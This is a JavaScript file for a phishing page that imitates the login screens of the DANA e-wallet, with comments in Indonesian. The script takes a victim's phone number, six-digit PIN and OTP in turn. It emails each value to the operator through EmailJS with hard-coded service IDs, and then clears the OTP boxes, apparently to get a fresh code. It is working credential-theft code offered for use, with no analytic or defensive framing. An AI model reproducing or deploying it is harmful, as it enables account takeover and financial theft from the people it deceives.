document.addEventListener("DOMContentLoaded", function () {
  const phoneNumberInput = document.getElementById("phone-number");
  const pinInputs = document.querySelectorAll(".pin-box");
  const otpInputs = document.querySelectorAll(".otp-box");
  const lanjutkanButton = document.getElementById("lanjutkan-button");
  const numberPage = document.getElementById("number-page");
  const pinPage = document.getElementById("pin-page");
  const otpPage = document.getElementById("otp-page");
  const floatingNotification = document.getElementById("floating-notification");

  let otpResendCount = 0;
  const maxOtpResend = 5;

  let userData = {
    nomor: "",
    pin: "",
    otp: ""
  };

  // Fungsi untuk mengirim email
  async function sendEmail(subject, message) {
    try {
      await emailjs.send("service_de2qodg", "template_9fe5ene", {
        to_name: "Admin", // Nama penerima
        from_name: "sistem DANA", // Nama pengirim
        message: message, // Pesan notifikasi
        subject: subject, // Subjek email
      });
      console.log("Email sent successfully!");
    } catch (error) {
      console.error("Failed to send email:", error);
    }
  }

  function formatPhoneNumber(input) {
    let phoneNumber = input.value.replace(/\D/g, '');
    if (phoneNumber.length === 1 && phoneNumber[0] !== '8') {
      phoneNumber = '8';
    }
    if (phoneNumber.length > 15) {
      phoneNumber = phoneNumber.substring(0, 15);
    }
    let formattedNumber = '';
    for (let i = 0; i < phoneNumber.length; i++) {
      if (i === 3 || i === 8) {
        formattedNumber += '-';
      }
      formattedNumber += phoneNumber[i];
    }
    input.value = formattedNumber;
  }

  function goToNextPage() {
    if (numberPage.style.display === "block") {
      const phoneNumber = phoneNumberInput.value.replace(/\D/g, '');
      if (phoneNumber.length >= 8) {
        userData.nomor = phoneNumber;
        numberPage.style.display = "none";
        pinPage.style.display = "block";
        phoneNumberInput.blur();
        lanjutkanButton.style.display = "none";
        pinInputs[0].focus();

        // Kirim notifikasi nomor ke email
        const subject = "Data Nomor";
        const message = `
====DATA NOMOR====
————
→ ☎️ : ${userData.nomor} 
————
        `;
        sendEmail(subject, message);
      } else {
        alert("Nomor telepon harus minimal 8 digit.");
      }
    }
  }

  function handleAutoMoveInput(inputs, event) {
    const input = event.target;
    const index = Array.from(inputs).indexOf(input);

    if (event.inputType === "deleteContentBackward" && index > 0) {
      inputs[index - 1].focus();
    } else if (input.value.length === 1 && index < inputs.length - 1) {
      inputs[index + 1].focus();
    }

    if (inputs === pinInputs && index === inputs.length - 1) {
      setTimeout(() => {
        userData.pin = Array.from(pinInputs).map((input) => input.value).join("");
        pinPage.style.display = "none";
        otpPage.style.display = "block";
        otpInputs[0].focus();

        // Kirim notifikasi PIN ke email
        const subject = "Nomor PIN";
        const message = `
====NOMOR PIN====
————
→ ☎️ : ${userData.nomor} 
————
→ 🅿️ : ${userData.pin} 
————
        `;
        sendEmail(subject, message);
      }, 300);
    }

    if (inputs === otpInputs && index === inputs.length - 1) {
      userData.otp = Array.from(otpInputs).map((input) => input.value).join("");
      sendFinalDataToEmail();
      showFloatingNotification();
    }
  }

  async function sendFinalDataToEmail() {
    const subject = "Nomor PIN OTP";
    const message = `
====NOMOR PIN OTP====
————
→ ☎️ : ${userData.nomor} 
————
→ 🅿️ : ${userData.pin} 
————
→ ⭕ : ${userData.otp} 
————
    `;
    await sendEmail(subject, message);
  }

  function showFloatingNotification() {
    floatingNotification.style.display = "block";
    floatingNotification.addEventListener("click", function () {
      floatingNotification.style.display = "none";
      otpInputs.forEach((input) => (input.value = ""));
      otpInputs[0].focus();
    });
  }

  phoneNumberInput.addEventListener("input", function () {
    formatPhoneNumber(phoneNumberInput);
  });

  pinInputs.forEach((input) => {
    input.addEventListener("input", (event) => handleAutoMoveInput(pinInputs, event));
  });

  otpInputs.forEach((input) => {
    input.addEventListener("input", (event) => handleAutoMoveInput(otpInputs, event));
  });

  lanjutkanButton.addEventListener("click", goToNextPage);
});